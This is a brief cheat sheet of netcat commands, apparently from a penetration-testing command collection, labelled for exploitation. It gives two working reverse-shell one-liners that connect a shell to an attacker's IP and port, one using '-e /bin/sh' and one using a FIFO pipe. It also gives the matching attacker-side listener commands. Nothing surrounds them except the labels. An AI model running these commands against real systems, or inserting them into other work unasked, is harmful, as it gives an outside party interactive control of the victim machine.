# [Exploitation] Reverse shell (connect to listener) --netcat
nc <attacker_ip> <port> -e /bin/sh

# [Exploitation] Reverse shell (no -e, FIFO trick) --netcat
mkfifo /tmp/.p; /bin/sh -i < /tmp/.p 2>&1 | nc <attacker_ip> <port> > /tmp/.p

# [Exploitation] TCP listener (attacker side) --netcat
nc -lvnp <port>

# [Exploitation] TCP listener with rlwrap (history) --netcat
rlwrap -cAr nc -lvnp <port>
